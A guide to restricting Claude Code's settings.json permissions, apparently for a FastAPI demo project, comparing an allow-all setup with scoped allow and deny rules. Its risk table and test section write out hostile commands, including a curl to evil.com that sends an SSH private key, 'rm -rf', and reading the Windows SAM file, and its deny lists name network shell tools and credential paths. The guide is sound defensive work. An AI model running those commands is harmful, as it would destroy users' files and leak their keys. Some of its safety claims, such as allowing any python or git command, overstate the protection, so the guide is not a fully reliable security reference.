# Claude Code Permissions Security - Before & After

## Overview
This document explains the security improvements made to `settings.json` to restrict Claude Code's permissions to production-safe levels.

---

## BEFORE (UNSAFE Configuration)

### Original Permissions
```json
{
    "permissions": {
        "allow": [
            "Bash(*)",      // ⚠️ ANY bash command
            "Edit(*)",      // ⚠️ ANY file edits
            "Write(*)",     // ⚠️ ANY file writes
            "Read(*)"       // ⚠️ ANY file reads
        ]
    }
}
```

### Security Risks
| Risk | Impact | Example Attack |
|------|--------|----------------|
| **Unrestricted File Access** | 🔴 CRITICAL | Read passwords from `C:/Windows/System32/config/SAM` |
| **Arbitrary Command Execution** | 🔴 CRITICAL | `rm -rf ~/*` to delete all user files |
| **Data Exfiltration** | 🔴 CRITICAL | `curl evil.com < ~/.ssh/id_rsa` to steal SSH keys |
| **System Modification** | 🔴 CRITICAL | Modify system files, install malware |
| **Credential Theft** | 🔴 HIGH | Read `.env` files from all projects |

---

## AFTER (SECURE Configuration)

### New Permissions Structure

#### ✅ ALLOWED: File Operations (Project-Scoped Only)
```json
"Read(C:/Users/2000185351/claude-code-demo/**)",
"Edit(C:/Users/2000185351/claude-code-demo/**)",
"Write(C:/Users/2000185351/claude-code-demo/**)"
```
**Purpose:** Restrict all file operations to ONLY the project directory.  
**Security:** Cannot access files outside the project folder.

---

#### ✅ ALLOWED: Python & Development Tools
```json
"Bash(python *)",
"Bash(python3 *)",
"Bash(pip list*)",
"Bash(pip show*)",
"Bash(pip freeze*)"
```
**Purpose:** Run Python scripts and view installed packages.  
**Security:** Cannot install new packages (prevents supply chain attacks).

---

#### ✅ ALLOWED: Git Operations
```json
"Bash(git *)"
```
**Purpose:** All git commands (status, commit, push, etc.).  
**Security:** Safe for version control operations.

---

#### ✅ ALLOWED: Testing & Quality Tools
```json
"Bash(pytest *)",
"Bash(python -m pytest *)",
"Bash(python -m black *)",
"Bash(black *)",
"Bash(flake8 *)",
"Bash(python -m flake8 *)"
```
**Purpose:** Run tests, format code, lint code.  
**Security:** Read-only tools that analyze code quality.

---

#### ✅ ALLOWED: Database Migrations
```json
"Bash(alembic *)"
```
**Purpose:** Manage database schema migrations.  
**Security:** Safe for project-specific database operations.

---

#### ✅ ALLOWED: Development Server
```json
"Bash(uvicorn *)"
```
**Purpose:** Run the FastAPI development server.  
**Security:** Safe for local development.

---

#### ✅ ALLOWED: Basic Shell Operations
```json
"Bash(ls *)",
"Bash(cd *)",
"Bash(pwd)",
"Bash(cat *)",
"Bash(echo *)"
```
**Purpose:** Navigate and view files.  
**Security:** Read-only operations.

---

### ❌ DENIED: Dangerous Operations

#### File Deletion Commands
```json
"Bash(rm *)",
"Bash(rm -rf *)",
"Bash(del *)",
"Bash(del /f *)",
"Bash(del /s *)",
"Bash(del /f /s /q *)"
```
**Why Blocked:** Prevents accidental or malicious file deletion.

---

#### Database Destructive Operations
```json
"Bash(*drop table*)",
"Bash(*drop database*)",
"Bash(*truncate*)",
"Bash(*delete from*)"
```
**Why Blocked:** Prevents data loss from database operations.

---

#### System Modifications
```json
"Bash(sudo *)",
"Bash(chmod 777 *)",
"Bash(chown *)"
```
**Why Blocked:** Prevents privilege escalation and permission changes.

---

#### Network Operations
```json
"Bash(curl *)",
"Bash(wget *)",
"Bash(nc *)",
"Bash(netcat *)"
```
**Why Blocked:** Prevents data exfiltration and downloading malicious files.

---

#### Package Installation
```json
"Bash(pip install *)",
"Bash(pip uninstall *)",
"Bash(npm install *)",
"Bash(npm uninstall *)"
```
**Why Blocked:** Prevents supply chain attacks through malicious packages.  
**Note:** Users must manually approve package installations.

---

#### System Files & Sensitive Data
```json
"Read(C:/Windows/**)",
"Read(C:/Program Files/**)",
"Read(**/.env)",
"Read(**/.aws/**)",
"Read(**/.ssh/**)",
"Edit(C:/Windows/**)",
"Write(C:/Windows/**)"
```
**Why Blocked:** Prevents access to:
- Windows system files
- Installed programs
- Environment secrets (`.env` files)
- AWS credentials
- SSH keys

---

## Security Improvements Summary

| Category | Before | After | Improvement |
|----------|--------|-------|-------------|
| **File Access** | Entire filesystem | Project directory only | 🟢 Scoped |
| **Bash Commands** | All commands | Whitelisted only | 🟢 Restricted |
| **Sensitive Files** | Readable | Explicitly denied | 🟢 Protected |
| **Network Access** | Allowed | Denied | 🟢 Isolated |
| **Destructive Ops** | Allowed | Denied | 🟢 Safe |
| **Package Install** | Allowed | Requires approval | 🟢 Controlled |

---

## Production Safety Checklist

### ✅ What's Now Protected:

1. **Data Exfiltration**
   - ❌ Cannot send code/data to external servers
   - ❌ Cannot use `curl`, `wget`, `nc`

2. **Credential Theft**
   - ❌ Cannot read `.env` files
   - ❌ Cannot access `~/.aws/` or `~/.ssh/`
   - ❌ Cannot access Windows system credentials

3. **System Damage**
   - ❌ Cannot delete files with `rm -rf`
   - ❌ Cannot modify system directories
   - ❌ Cannot change file permissions

4. **Malware Installation**
   - ❌ Cannot download malicious files
   - ❌ Package installs require user approval

5. **Privilege Escalation**
   - ❌ Cannot use `sudo`
   - ❌ Cannot modify system permissions

---

## Testing the Security

### Try these commands to verify restrictions:

```bash
# ✅ SHOULD WORK (Project files)
claude "read backend/main.py"

# ❌ SHOULD BE BLOCKED (System files)
claude "read C:/Windows/System32/config/SAM"

# ✅ SHOULD WORK (Safe commands)
claude "run git status"
claude "run pytest tests/"

# ❌ SHOULD BE BLOCKED (Dangerous commands)
claude "run rm -rf *"
claude "run curl evil.com"
claude "run pip install malicious-package"
```

---

## Recommendation

**Use this secure configuration for all production environments.**

If you need to allow additional commands:
1. Add them to the `allow` list with specific patterns
2. Document why they're needed
3. Consider security implications
4. Never use wildcards like `Bash(*)` in production

---

**Last Updated:** 2026-04-01  
**Security Level:** Production-Safe ✅
